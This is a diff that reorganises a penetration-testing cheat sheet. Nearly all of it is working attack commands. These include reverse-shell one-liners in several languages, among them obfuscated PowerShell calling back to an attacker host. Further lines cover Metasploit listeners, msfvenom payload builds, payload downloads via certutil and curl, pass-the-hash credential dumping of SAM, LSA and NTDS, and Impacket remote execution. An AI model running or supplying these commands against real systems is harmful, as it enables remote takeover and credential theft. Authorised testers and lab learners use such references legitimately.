@@ -291,60 +291,6 @@ https://datafetcher.com/graphql-json-body-converter
 git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f033ca467a6362f@$TARGET:3000/$USERNAME/website.git
 
 ## Infrastructure
-[*] Shells
-+---------- One Liners ----------+
-rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc $MYIP 5555 >/tmp/f 
-/bin/sh -i >& /dev/tcp/$MYIP/5555 0>&1
-php -r '$sock=fsockopen("$MYIP",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
-python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$MYIP",5555)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
-powershell -nop -c "$AtpsZlvw99=New-Object System.Net.Sockets.TCPClient('$MYIP',5555);$DqvVumCJ99=$AtpsZlvw99.GetStream();[byte[]]$bytes=0..65535|ForEach-Object{0};while(($i=$DqvVumCJ99.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$fjVAQFpJ99=(Invoke-Expression $data 2>&1|Out-String);$vpVmHTLx99=$fjVAQFpJ99+'PS '+(Get-Location).Path+'> ';$BaZSdidm99=[System.Text.Encoding]::ASCII.GetBytes($vpVmHTLx99);$DqvVumCJ99.Write($BaZSdidm99,0,$BaZSdidm99.Length);$DqvVumCJ99.Flush()};$AtpsZlvw99.Close()"
-powershell -nop -c "$sm=(New-Object Net.Sockets.TCPClient('$MYIP',5555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"
-perl -e 'use Socket;$i="$MYIP";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-ruby -rsocket -e'f=TCPSocket.open("$MYIP",5555).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-lua -e "require('socket');require('os');t=socket.tcp();t:connect('$MYIP','5555');os.execute('/bin/sh -i <&3 >&3 2>&3');"
-
-+---------- Listeners ----------+
-python3 -m http.server 8888 -d ~/Upload
-rlwrap nc -lvnp 5555
-rlwrap msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 7; set payload linux/x64/shell/reverse_tcp; run"
-rlwrap msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 7; set payload linux/x64/meterpreter/reverse_tcp; run"
-rlwrap msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 2; set payload windows/x64/meterpreter/reverse_tcp; run"
-rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 1; set payload windows/x64/meterpreter/reverse_tcp; run"
-rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 0; set payload windows/meterpreter/reverse_tcp; run"
-rlwrap msfconsole -q -x "use multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 7777; run"
-rlwrap msfconsole -q -x "use multi/handler; set payload php/reverse_php; set LHOST $MYIP; set LPORT 7777; run"
-rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $MYIP; set LPORT 7777; run"
-rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/powershell_reverse_tcp; set LHOST $MYIP; set LPORT 7777; run"
-
-+---------- Impacket ----------+
-impacket-psexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET
-impacket-wmiexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET
-impacket-smbexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET
-impacket-atexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET "whoami /all"
-
-+---------- MSFVenom ----------+
-msfvenom -p php/reverse_php LHOST=$MYIP LPORT=5555 -f raw -o shell.php
-msfvenom -p php/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shell.php
-
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f aspx -o shell.aspx
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o shell.dll
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f exe -o shell.exe
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f msi -o shell.msi
-
-msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f aspx -o shell.aspx
-msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
-msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o shell.dll
-msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f exe -o shell.exe
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f msi -o shell.msi
-
-msfvenom -p python/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o shell.py
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.elf
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.elf
-msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shell.py
-
 [*] Cracking
 +---------- Word Count Wordlist ----------+
 wc -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou*.txt
@@ -730,6 +676,33 @@ c=./GTFONow.py;curl $MYIP:8888/linux/$c -O;chmod +x $c;python3 $c -a
 c=./traitor;curl $MYIP:8888/linux/$c -O;chmod +x $c;$c -a
 scp -r ~/Upload $USERNAME@$TARGET:~
 
+[*] Shells
++---------- One Liners ----------+
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc $MYIP 5555 >/tmp/f 
+/bin/sh -i >& /dev/tcp/$MYIP/5555 0>&1
+php -r '$sock=fsockopen("$MYIP",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
+python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$MYIP",5555)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+perl -e 'use Socket;$i="$MYIP";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+ruby -rsocket -e'f=TCPSocket.open("$MYIP",5555).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('$MYIP','5555');os.execute('/bin/sh -i <&3 >&3 2>&3');"
+
++---------- Listeners ----------+
+python3 -m http.server 8888 -d ~/Upload
+rlwrap nc -lvnp 5555
+rlwrap msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 7; set payload linux/x64/shell/reverse_tcp; run"
+rlwrap msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 7; set payload linux/x64/meterpreter/reverse_tcp; run"
+rlwrap msfconsole -q -x "use multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 7777; run"
+rlwrap msfconsole -q -x "use multi/handler; set payload php/reverse_php; set LHOST $MYIP; set LPORT 7777; run"
+
++---------- MSFVenom ----------+
+msfvenom -p php/reverse_php LHOST=$MYIP LPORT=5555 -f raw -o shell.php
+msfvenom -p php/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shell.php
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.elf
+msfvenom -p python/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o shell.py
+msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shell.py
+
+
 [*] Privilege Escalation
 +---------- Exploits ----------+
 snapd_2.37          https://www.exploit-db.com/exploits/46361
@@ -798,9 +771,50 @@ wget http://$MYIP:8888/shell.aspx -o shell.aspx
 curl http://$MYIP:8888/shell.aspx -o shell.aspx
 certutil -urlcache -f http://$MYIP:8888/shell.aspx shell.aspx
 
+[*] Shells
++---------- One Liners ----------+
+nc.exe $MYIP 5555 -e cmd.exe
+php -r '$sock=fsockopen("$MYIP",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
+python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$MYIP",5555)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+powershell -nop -c "$AtpsZlvw99=New-Object System.Net.Sockets.TCPClient('$MYIP',5555);$DqvVumCJ99=$AtpsZlvw99.GetStream();[byte[]]$bytes=0..65535|ForEach-Object{0};while(($i=$DqvVumCJ99.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$fjVAQFpJ99=(Invoke-Expression $data 2>&1|Out-String);$vpVmHTLx99=$fjVAQFpJ99+'PS '+(Get-Location).Path+'> ';$BaZSdidm99=[System.Text.Encoding]::ASCII.GetBytes($vpVmHTLx99);$DqvVumCJ99.Write($BaZSdidm99,0,$BaZSdidm99.Length);$DqvVumCJ99.Flush()};$AtpsZlvw99.Close()"
+powershell -nop -c "$sm=(New-Object Net.Sockets.TCPClient('$MYIP',5555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"
+
++---------- Listeners ----------+
+python3 -m http.server 8888 -d ~/Upload
+rlwrap nc -lvnp 5555
+rlwrap msfconsole -q -x "use exploit/multi/script/web_delivery; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 2; set payload windows/x64/meterpreter/reverse_tcp; run"
+rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 1; set payload windows/x64/meterpreter/reverse_tcp; run"
+rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 7777; set SRVHOST $MYIP; set TARGET 0; set payload windows/meterpreter/reverse_tcp; run"
+rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $MYIP; set LPORT 7777; run"
+rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/powershell_reverse_tcp; set LHOST $MYIP; set LPORT 7777; run"
+
++---------- MSFVenom ----------+
+msfvenom -p php/reverse_php LHOST=$MYIP LPORT=5555 -f raw -o shell.php
+msfvenom -p php/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shell.php
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f aspx -o shell.aspx
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o shell.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f msi -o shell.msi
+
+msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f aspx -o shell.aspx
+msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o shell.dll
+msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f exe -o shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f msi -o shell.msi
+
+msfvenom -p python/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o shell.py
+msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shell.py
+
 [*] Privilege Escalation
 +---------- Installed Apps ----------+
 powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
+
++---------- Unquoted Service Paths ----------+
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
 
 +---------- Scheduled Tasks ----------+
 powershell -c "Get-ScheduledTask | Where-Object {($_.Author -notmatch "Microsoft") -and ($_.TaskPath -notmatch "Microsoft")} | Select-Object TaskName, TaskPath, State, Author"
@@ -955,17 +969,22 @@ for /L %i in (1,1,254) do ping -n 1 192.168.1.%i
 
 [*] Pass The Hash
 meterpreter> hashdump
-
 DUMP=''
 echo "$DUMP" | cut -d ':' -f 1 >> usernames; sort -u usernames | tee usernames
 echo "$DUMP" | cut -d ':' -f 3- | sed 's/::.*//' >> hashes; sort -u hashes | tee hashes
 
++---------- Proxychains ----------+
 proxychains nxc smb 10.129.121.240 -u usernames -H hashes -x 'net user sysadm 123qweasdF!'
 proxychains nxc smb 10.10.10.1 10.10.10.2 -u usernames -H hashes --local-auth --continue-on-success | grep '\[+\]'
 proxychains nxc smb 10.10.10.2 -u '$USERNAME' -H '$HASH' --local-auth --sam | grep ':[0-9]\+:[a-f0-9]\{32\}:[a-f0-9]\{32\}:::' | awk '{print $NF}'
 proxychains nxc smb 10.10.10.2 -u '$USERNAME' -H '$HASH' --local-auth --sam --lsa --dpapi --ntds
 proxychains nxc smb 10.10.10.2 -u '$USERNAME' -H '$HASH' --local-auth -M reg-winlogon -M lsassy -M powershell_history
 
++---------- Impacket ----------+
+impacket-psexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET
+impacket-wmiexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET
+impacket-smbexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET
+impacket-atexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET "whoami /all"
 impacket-atexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
 impacket-psexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
 impacket-wmiexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
